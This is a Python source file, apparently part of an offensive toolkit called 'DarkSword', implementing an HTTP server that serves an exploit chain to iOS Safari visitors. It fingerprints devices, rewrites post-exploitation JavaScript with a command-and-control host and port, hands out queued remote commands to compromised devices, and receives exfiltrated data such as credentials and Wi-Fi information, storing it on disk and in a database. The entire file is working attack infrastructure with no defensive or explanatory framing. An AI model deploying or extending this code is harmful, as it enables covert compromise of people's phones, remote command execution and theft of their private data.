"""HTTP server for DarkSword exploit chain delivery."""

import base64
import json
import re
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse
from typing import Optional

from .config import get_payloads_dir, get_templates_dir, ServeConfig

EXFIL_DIR: Optional[Path] = None

try:
    from admin.database import SessionLocal, Log, Device, ExfilData, Command
    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False


def save_log_to_db(log_type: str, ip: str, method: str = None, path: str = None, 
                   status_code: int = None, content_length: int = None, user_agent: str = None,
                   device_uuid: str = None):
    if not DB_AVAILABLE:
        return
    try:
        db = SessionLocal()
        log = Log(
            timestamp=datetime.now(),
            ip=ip,
            method=method,
            path=path,
            status_code=status_code,
            content_length=content_length,
            user_agent=user_agent,
            log_type=log_type,
            device_uuid=device_uuid
        )
        db.add(log)
        db.commit()
        db.close()
    except Exception:
        pass


def parse_user_agent(user_agent: str):
    os_version = None
    safari_version = None
    device_model = None
    chipset = None
    
    if user_agent:
        version_match = re.search(r'Version/([0-9.]+)', user_agent)
        if version_match:
            os_version = version_match.group(1)
        
        safari_match = re.search(r'Safari/([0-9.]+)', user_agent)
        if safari_match:
            safari_version = safari_match.group(1)
        
        if 'iPhone' in user_agent:
            device_model = 'iPhone'
        elif 'iPad' in user_agent:
            device_model = 'iPad'
        elif 'iPod' in user_agent:
            device_model = 'iPod Touch'
        
        if os_version and device_model:
            version_map = {
                '18.7': 'A17 Pro / A18',
                '18.6': 'A17 Pro / A18',
                '18.5': 'A17 Pro / A18',
                '18.4': 'A17 Pro / A18',
            }
            chipset = version_map.get(os_version)
    
    return os_version, safari_version, device_model, chipset


def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
    if not DB_AVAILABLE:
        return
    try:
        db = SessionLocal()
        device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
        
        os_version, safari_version, device_model, chipset = parse_user_agent(user_agent)
        
        if device:
            device.last_seen = datetime.now()
            device.ip = ip
            if user_agent:
                device.user_agent = user_agent
            if os_version and not device.os_version:
                device.os_version = os_version
            if safari_version and not device.safari_version:
                device.safari_version = safari_version
            if device_model and not device.device_model:
                device.device_model = device_model
            if chipset and not device.chipset:
                device.chipset = chipset
        else:
            device = Device(
                device_uuid=device_uuid,
                first_seen=datetime.now(),
                last_seen=datetime.now(),
                ip=ip,
                user_agent=user_agent,
                status="active",
                os_version=os_version,
                safari_version=safari_version,
                device_model=device_model,
                chipset=chipset
            )
            db.add(device)
        db.commit()
        db.close()
    except Exception:
        pass


def save_exfil_to_db(device_uuid: str, category: str, path: str, description: str, 
                     file_path: str, file_size: int):
    if not DB_AVAILABLE:
        return
    try:
        db = SessionLocal()
        exfil = ExfilData(
            device_uuid=device_uuid,
            category=category,
            path=path,
            description=description,
            file_path=file_path,
            file_size=file_size,
            uploaded_at=datetime.now()
        )
        db.add(exfil)
        db.commit()
        db.close()
    except Exception:
        pass



def get_pending_command(device_uuid: str):
    if not DB_AVAILABLE:
        return None
    try:
        db = SessionLocal()
        command = db.query(Command).filter(
            Command.device_uuid == device_uuid,
            Command.status == 'pending'
        ).order_by(Command.created_at).first()
        if command:
            command.status = 'executing'
            db.commit()
            db.close()
            return {'id': command.id, 'command': command.command}
        db.close()
    except Exception:
        pass
    return None
def update_command_result(command_id: int, output: str, status: str = 'completed'):
    if not DB_AVAILABLE:
        return None
    try:
        db = SessionLocal()
        command = db.query(Command).filter(Command.id == command_id).first()
        if command:
            command.status = status
            command.output = output
            command.executed_at = datetime.now()
            db.commit()
            db.close()
    except Exception:
        pass
def log_to_file(msg: str, log_path: Optional[Path] = None) -> None:
    """Write log message to file."""
    if log_path:
        try:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
        except Exception:
            pass


class DarkSwordHandler(SimpleHTTPRequestHandler):
    """Custom request handler for serving exploit chain with logging."""

    config: Optional[ServeConfig] = None
    payloads_dir: Path = get_payloads_dir()
    templates_dir: Path = get_templates_dir()
    log_path: Optional[Path] = None

    def __init__(self, *args, directory: Optional[Path] = None, **kwargs):
        self.base_directory = directory or self.payloads_dir
        super().__init__(*args, directory=str(self.base_directory), **kwargs)

    def log_message(self, format: str, *args) -> None:
        """Override to use rich formatting and log all requests."""
        msg = format % args
        if "favicon" not in msg.lower():
            log_str = f"[REQUEST] {msg}"
            print(f"  {log_str}")
            log_to_file(log_str, self.log_path)

    def end_headers(self) -> None:
        """Add CORS and security headers for exploit delivery."""
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        super().end_headers()

    def _get_c2_host_port(self) -> tuple:
        config = self.config or getattr(self, "config", None)
        host = "localhost"
        port = str(config.port) if config else "8080"
        if config and config.custom_host_in_loader:
            url = config.custom_host_in_loader
            if "://" in url:
                url = url.split("://", 1)[1]
            if "/" in url:
                url = url.split("/", 1)[0]
            if ":" in url:
                host, port = url.rsplit(":", 1)
            else:
                host = url
        else:
            host_header = self.headers.get("Host", "")
            if ":" in host_header:
                host, port = host_header.rsplit(":", 1)
            else:
                host = host_header
        return host, port

    def _infer_local_host_from_request(self) -> Optional[str]:
        """Base URL for worker getJS when --c2-host is not set (uses Host from this request)."""
        host_header = (self.headers.get("Host") or "").strip()
        if not host_header:
            return None
        return f"http://{host_header}"

    def _inject_c2_into_pe_main(self, content: bytes, path: Path) -> bytes:
        if path.name not in ["pe_main.js", "post_exploit.js"] or b"__DS_C2" not in content:
            return content
        config = self.config
        if not config:
            return content
        host, port = self._get_c2_host_port()
        content_str = content.decode("utf-8", errors="replace")
        content_str = content_str.replace("__DS_C2_HOST__", host)
        content_str = content_str.replace("__DS_C2_PORT__", port)
        content_str = content_str.replace("__DS_C2_HTTPS__", "false")
        return content_str.encode("utf-8")

    def serve_file(self, path: Path, content_type: str = "application/octet-stream") -> bool:
        """Serve a file with optional content type."""
        try:
            with open(path, "rb") as f:
                content = f.read()

            if path.name == "pe_main.js":
                content = self._inject_c2_into_pe_main(content, path)
            elif path.suffix == ".js":
                content_str = content.decode("utf-8", errors="replace")
                if "var localHost" in content_str:
                    cfg = self.config
                    local_url = None
                    if cfg and cfg.custom_host_in_loader:
                        local_url = cfg.custom_host_in_loader
                    else:
                        local_url = self._infer_local_host_from_request()
                    if local_url:
                        content_str = re.sub(
                            r'var localHost\s*=\s*"[^"]*"',
                            f'var localHost = "{local_url}"',
                            content_str,
                        )
                        content = content_str.encode("utf-8")

            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
            return True
        except Exception as e:
            print(f"  [ERROR] Failed to serve {path}: {e}")
            return False

    def do_GET(self) -> None:
        """Handle GET requests - serve from payloads or templates."""
        parsed = urlparse(self.path)
        client_ip = self.client_address[0] if self.client_address else "unknown"
        user_agent = self.headers.get("User-Agent", "")
        
        device_uuid = None
        if parsed.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed.query)
            if 'device' in params:
                device_uuid = params['device'][0]
            elif 'uuid' in params:
                device_uuid = params['uuid'][0]
            elif 'deviceUUID' in params:
                device_uuid = params['deviceUUID'][0]
        
        if not device_uuid and ('iPhone' in user_agent or 'iPad' in user_agent or 'iOS' in user_agent):
            import hashlib
            import uuid
            hash_input = f"{client_ip}_{user_agent}_{datetime.now().strftime('%Y%m%d')}"
            device_uuid = hashlib.md5(hash_input.encode()).hexdigest()[:32]
        
        if device_uuid:
            update_device_in_db(device_uuid, client_ip, user_agent)
        
        request_log = f"GET {self.path} from {client_ip}"
        if device_uuid:
            request_log += f" (device: {device_uuid})"
        print(f"  [REQUEST] {request_log}")
        log_to_file(request_log, self.log_path)
        log_type = "ios" if device_uuid else "request"
        save_log_to_db(log_type, client_ip, "GET", self.path, user_agent=user_agent, device_uuid=device_uuid)
        
        norm_log = parsed.path.rstrip("/") or "/"
        if norm_log == "/log.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"OK")
            return

        path = parsed.path.strip("/") or "index.html"
        if ".." in path:
            self.send_error(403, "Forbidden")
            return

        for base in [self.payloads_dir, self.templates_dir]:
            file_path = (base / path).resolve()
            if not str(file_path).startswith(str(base.resolve())):
                continue
            if file_path.exists() and file_path.is_file():
                break
        else:
            file_path = None

        if parsed.path.strip("/") == "cmd":
            from urllib.parse import parse_qs
            params = parse_qs(parsed.query)
            device_uuid = params.get("device_uuid", [None])[0]
            if device_uuid:
                cmd = get_pending_command(device_uuid)
                if cmd:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(cmd).encode())
                    return
            self.send_response(204)
            self.end_headers()
            return

        if file_path and file_path.exists() and file_path.is_file():
            suffix = file_path.suffix.lower()
            content_types = {
                ".html": "text/html",
                ".js": "application/javascript",
                ".css": "text/css",
                ".json": "application/json",
            }
            content_type = content_types.get(suffix, "application/octet-stream")
            if self.serve_file(file_path, content_type):
                return

        super().do_GET()

    def do_POST(self) -> None:
        """Handle POST - /upload receives exfiltrated data from payload."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        parsed = urlparse(self.path)
        client_ip = self.client_address[0] if self.client_address else "unknown"
        user_agent = self.headers.get("User-Agent", "")
        
        if parsed.path.strip("/") == "cmd_result":
            request_log = f"POST /cmd_result from {client_ip} ({content_length} bytes)"
            print(f"  [REQUEST] {request_log}")
            log_to_file(request_log, self.log_path)
            
            try:
                data = json.loads(body.decode("utf-8"))
                command_id = data.get("id")
                output = data.get("output", "")
                status = data.get("status", "completed")
                if command_id:
                    update_command_result(command_id, output, status)
            except:
                pass
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            return
            
        if parsed.path.strip("/") == "upload":
            request_log = f"POST /upload from {client_ip} ({content_length} bytes)"
            print(f"  [REQUEST] {request_log}")
            log_to_file(request_log, self.log_path)
            
            device_uuid = None
            try:
                data = json.loads(body.decode("utf-8"))
                device_uuid = data.get("deviceUUID", None)
            except:
                pass
            
            save_log_to_db("exfil", client_ip, "POST", "/upload", content_length=content_length, user_agent=user_agent, device_uuid=device_uuid)
            self._handle_upload(body)
            return
        
        request_log = f"POST {self.path} from {client_ip} ({content_length} bytes)"
        print(f"  [POST] {request_log}")
        log_to_file(request_log, self.log_path)
        save_log_to_db("request", client_ip, "POST", self.path, content_length=content_length, user_agent=user_agent)
        self.send_response(404)
        self.end_headers()

    def _handle_upload(self, body: bytes) -> None:
        try:
            data = json.loads(body.decode("utf-8"))
            device = data.get("deviceUUID", "unknown")
            category = data.get("category", "data")
            path = data.get("path", "unknown")
            desc = data.get("description", "")
            b64 = data.get("data", "")
            client_ip = self.client_address[0] if self.client_address else "unknown"
            user_agent = self.headers.get("User-Agent", "")
            
            update_device_in_db(device, client_ip, user_agent)
            
            if b64:
                raw = base64.b64decode(b64)
                exfil_dir = EXFIL_DIR or (get_payloads_dir().parent / "exfil")
                exfil_dir.mkdir(parents=True, exist_ok=True)
                safe_device = re.sub(r'[^\w\-]', '_', device)[:64]
                ext = ".txt" if "credential" in category.lower() or "wifi" in str(desc).lower() else ".bin"
                fname = f"{safe_device}_{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                out_path = exfil_dir / fname
                out_path.write_bytes(raw)
                log_str = f"[EXFIL] {device} | {category} | {path} -> {out_path}"
                print(f"  {log_str}")
                log_to_file(log_str, self.log_path)
                save_exfil_to_db(device, category, path, desc, str(out_path), len(raw))
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        except Exception as e:
            print(f"  [UPLOAD ERROR] {e}")
            self.send_response(500)
            self.end_headers()


def run_server(config: ServeConfig) -> None:
    """Start the exploit delivery HTTP server."""
    DarkSwordHandler.config = config
    DarkSwordHandler.payloads_dir = get_payloads_dir()
    DarkSwordHandler.templates_dir = get_templates_dir()

    log_path = get_payloads_dir().parent / "server.log"
    log_path.parent.mkdir(parents=True, exist_ok=True)
    DarkSwordHandler.log_path = log_path

    server = HTTPServer((config.host, config.port), DarkSwordHandler)
    startup_msg = f"DarkSword server listening on http://{config.host}:{config.port}"
    print(f"\n[*] {startup_msg}")
    log_to_file(startup_msg, log_path)
    
    payloads_msg = f"Payloads: {get_payloads_dir()}"
    print(f"[*] {payloads_msg}")
    log_to_file(payloads_msg, log_path)
    
    access_msg = f"Access: http://localhost:{config.port}/ or http://<IP>:{config.port}/"
    print(f"[*] {access_msg}")
    log_to_file(access_msg, log_path)
    
    if not config.custom_host_in_loader:
        host_msg = (
            "rce_loader localHost: auto from each request Host (http). "
            "Use --c2-host https://... if you need HTTPS or a public URL."
        )
        print(f"[*] {host_msg}")
        log_to_file(host_msg, log_path)
    exfil_dir = get_payloads_dir().parent / "exfil"
    exfil_msg = f"Exfil data saved to: {exfil_dir}"
    print(f"[*] {exfil_msg}")
    log_to_file(exfil_msg, log_path)
    
    log_msg = f"Logs saved to: {log_path}"
    print(f"[*] {log_msg}")
    log_to_file(log_msg, log_path)
    
    print("\n[!] Press Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        stop_msg = "Server stopped."
        print(f"\n[*] {stop_msg}")
        log_to_file(stop_msg)
        server.shutdown()
